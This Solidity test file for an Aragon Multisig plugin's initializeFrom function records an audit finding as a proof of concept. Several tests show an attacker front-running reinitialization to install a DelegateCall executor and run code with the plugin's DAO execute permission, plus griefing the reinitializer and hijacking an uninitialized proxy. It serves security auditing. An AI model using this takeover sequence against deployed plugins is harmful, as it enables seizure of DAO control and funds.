// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.28;

import {BaseTest} from "../../../../BaseTest.t.sol";

import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IDAO} from "@aragon/osx-commons-contracts/src/dao/IDAO.sol";
import {IPlugin} from "@aragon/osx-commons-contracts/src/plugin/IPlugin.sol";
import {PluginUUPSUpgradeable} from "@aragon/osx-commons-contracts/src/plugin/PluginUUPSUpgradeable.sol";
import {
    MetadataExtensionUpgradeable
} from "@aragon/osx-commons-contracts/src/utils/metadata/MetadataExtensionUpgradeable.sol";

import {Multisig} from "../../../../../src/Multisig.sol";
import {CustomExecutorMock} from "../../../../utils/mocks/CustomExecutorMock.sol";

contract InitializeFrom_Multisig_UnitTest is BaseTest {
    bytes internal constant ALREADY_INITIALIZED = "Initializable: contract is already initialized";
    bytes internal constant NEW_METADATA = "ipfs://new-metadata";

    address internal attacker;
    CustomExecutorMock internal executor;

    function setUp() public override {
        super.setUp();
        attacker = makeAddr("attacker");
        executor = new CustomExecutorMock();
    }

    /// @dev Rewinds the OZ `_initialized` counter (slot 0, byte 0) to `_version`, keeping the rest of the state.
    ///      Version 1 is what a build 1 or 2 proxy carries (`initializer`) before being upgraded to build 3.
    function _setInitializedVersion(address _proxy, uint8 _version) internal {
        bytes32 slot0 = vm.load(_proxy, bytes32(0));
        vm.store(_proxy, bytes32(0), (slot0 & ~bytes32(uint256(0xff))) | bytes32(uint256(_version)));
    }

    function _initializedVersion(address _proxy) internal view returns (uint8) {
        return uint8(uint256(vm.load(_proxy, bytes32(0))));
    }

    function _initData(IPlugin.TargetConfig memory _target, bytes memory _metadata)
        internal
        pure
        returns (bytes memory)
    {
        return abi.encode(_target, _metadata);
    }

    function _delegateCallTarget() internal view returns (IPlugin.TargetConfig memory) {
        return IPlugin.TargetConfig({target: address(executor), operation: IPlugin.Operation.DelegateCall});
    }

    function test_RevertWhen_CalledOnAProxyInitializedAtBuild3() external {
        // it should revert, the reinitializer(2) step is already consumed by `initialize`.
        vm.prank(attacker);
        vm.expectRevert(ALREADY_INITIALIZED);
        multisig.initializeFrom(1, _initData(_delegateCallTarget(), NEW_METADATA));
    }

    function test_RevertWhen_CalledOnTheImplementation() external {
        // it should revert, initializers are disabled.
        Multisig implementation = new Multisig();
        vm.expectRevert(ALREADY_INITIALIZED);
        implementation.initializeFrom(1, _initData(_daoTarget(), NEW_METADATA));
    }

    modifier givenAProxyComingFromBuild1Or2() {
        _setInitializedVersion(address(multisig), 1);
        _;
    }

    function test_WhenFromBuildIsBelow3() external givenAProxyComingFromBuild1Or2 {
        // it should set the target config and the metadata.
        // it should emit TargetSet and then MetadataSet.
        // it should bump the initialized version to 2.
        IPlugin.TargetConfig memory target =
            IPlugin.TargetConfig({target: address(executor), operation: IPlugin.Operation.Call});

        vm.expectEmit(address(multisig));
        emit PluginUUPSUpgradeable.TargetSet(target);
        vm.expectEmit(address(multisig));
        emit MetadataExtensionUpgradeable.MetadataSet(NEW_METADATA);

        multisig.initializeFrom(2, _initData(target, NEW_METADATA));

        assertEq(multisig.getCurrentTargetConfig().target, address(executor), "target");
        assertEq(uint8(multisig.getCurrentTargetConfig().operation), uint8(IPlugin.Operation.Call), "operation");
        assertEq(multisig.getMetadata(), NEW_METADATA, "metadata");
        assertEq(_initializedVersion(address(multisig)), 2, "version");
    }

    function test_WhenFromBuildIsBelow3_ItShouldKeepMembersAndSettings() external givenAProxyComingFromBuild1Or2 {
        // it should not touch members or settings.
        multisig.initializeFrom(1, _initData(_daoTarget(), NEW_METADATA));

        assertEq(multisig.addresslistLength(), 3, "length");
        assertTrue(multisig.isListed(alice) && multisig.isListed(bob) && multisig.isListed(carol), "members");
        (bool onlyListed, uint16 minApprovals) = multisig.multisigSettings();
        assertTrue(onlyListed, "onlyListed");
        assertEq(minApprovals, 2, "minApprovals");
    }

    function test_WhenCalledByAnyone_ItShouldTakeOverTheExecutionTarget() external givenAProxyComingFromBuild1Or2 {
        // it should let any account set the target config (no access control).
        // it should make proposal execution delegatecall into the attacker's contract from the plugin context.
        // FINDING: F2. `initializeFrom` has no access control. If a build 1/2 proxy is upgraded with a bare
        // `upgradeTo` (not through the PSP, which upgrades and calls atomically), anyone can front-run the
        // reinitialization and install a DelegateCall target. The plugin holds EXECUTE_PERMISSION on the DAO.
        vm.prank(attacker);
        multisig.initializeFrom(1, _initData(_delegateCallTarget(), NEW_METADATA));

        assertEq(multisig.getCurrentTargetConfig().target, address(executor), "target");
        assertEq(uint8(multisig.getCurrentTargetConfig().operation), uint8(IPlugin.Operation.DelegateCall), "operation");

        uint256 proposalId = _createPassedProposal();

        // `self == multisig` proves the attacker code ran inside the plugin (delegatecall).
        vm.expectEmit(address(multisig));
        emit CustomExecutorMock.ExecutedCustom(address(multisig), address(this), bytes32(proposalId), 1, 0);
        multisig.execute(proposalId);
    }

    function test_WhenFromBuildIs3OrHigher() external givenAProxyComingFromBuild1Or2 {
        // it should not change the target config nor the metadata.
        // it should consume the reinitializer, so a later legitimate reinitialization reverts.
        // FINDING: F2 (griefing). Anyone can burn the reinitializer with `_fromBuild >= 3` and arbitrary data.
        IPlugin.TargetConfig memory targetBefore = multisig.getCurrentTargetConfig();

        vm.prank(attacker);
        multisig.initializeFrom(3, hex"deadbeef");

        assertEq(_initializedVersion(address(multisig)), 2, "version");
        assertEq(multisig.getCurrentTargetConfig().target, targetBefore.target, "target");
        assertEq(multisig.getMetadata(), PLUGIN_METADATA, "metadata");

        vm.expectRevert(ALREADY_INITIALIZED);
        multisig.initializeFrom(1, _initData(_delegateCallTarget(), NEW_METADATA));
    }

    function test_WhenFromBuildIsTheMaximum() external givenAProxyComingFromBuild1Or2 {
        // it should behave like build 3 (no-op) and ignore the data.
        multisig.initializeFrom(type(uint16).max, "");
        assertEq(_initializedVersion(address(multisig)), 2);
    }

    function test_RevertWhen_InitDataIsEmpty() external givenAProxyComingFromBuild1Or2 {
        // it should revert, the data cannot be decoded.
        vm.expectRevert();
        multisig.initializeFrom(1, "");
        assertEq(_initializedVersion(address(multisig)), 1, "version unchanged");
    }

    function test_RevertWhen_InitDataIsTruncated() external givenAProxyComingFromBuild1Or2 {
        // it should revert.
        bytes memory data = _initData(_daoTarget(), NEW_METADATA);
        bytes memory truncated = new bytes(data.length - 33);
        for (uint256 i; i < truncated.length; ++i) {
            truncated[i] = data[i];
        }
        vm.expectRevert();
        multisig.initializeFrom(1, truncated);
    }

    function test_RevertWhen_TargetIsTheDaoWithDelegateCall() external givenAProxyComingFromBuild1Or2 {
        // it should revert.
        IPlugin.TargetConfig memory target =
            IPlugin.TargetConfig({target: address(dao), operation: IPlugin.Operation.DelegateCall});
        vm.expectRevert(abi.encodeWithSelector(PluginUUPSUpgradeable.InvalidTargetConfig.selector, target));
        multisig.initializeFrom(1, _initData(target, NEW_METADATA));
    }

    function test_WhenCalledOnABareProxy() external {
        // it should succeed (version 0 to 2) without a DAO.
        // it should block `initialize` afterwards (front-running a non-atomic deployment).
        Multisig implementation = new Multisig();
        Multisig bare = Multisig(address(new ERC1967Proxy(address(implementation), "")));

        vm.prank(attacker);
        bare.initializeFrom(1, _initData(_delegateCallTarget(), NEW_METADATA));

        assertEq(address(bare.dao()), address(0), "dao");
        assertEq(bare.getCurrentTargetConfig().target, address(executor), "target");

        vm.expectRevert(PluginUUPSUpgradeable.AlreadyInitialized.selector);
        bare.initialize(IDAO(address(dao)), _members(alice), _settings(false, 1), _daoTarget(), PLUGIN_METADATA);
    }
}
